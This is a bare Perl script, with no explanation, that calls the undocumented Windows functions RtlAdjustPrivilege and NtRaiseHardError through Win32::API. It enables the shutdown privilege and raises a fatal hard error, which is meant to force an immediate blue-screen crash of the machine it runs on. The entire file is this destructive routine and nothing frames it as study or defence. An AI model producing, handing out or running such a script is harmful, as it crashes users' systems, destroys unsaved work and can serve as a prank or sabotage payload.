use Win32::API;

my $RtlAdjustPrivilege = Win32::API->new('ntdll', 'RtlAdjustPrivilege', 'NNNN', 'N');
my $NtRaiseHardError = Win32::API->new('ntdll', 'NtRaiseHardError', 'NNNNNN', 'N');

my $enabled = pack('L', 0);
my $response = pack('L', 0);

$RtlAdjustPrivilege->Call(19, 1, 0, unpack('L', $enabled));
$NtRaiseHardError->Call(0xC0000420, 0, 0, 0, 6, unpack('L', $response));

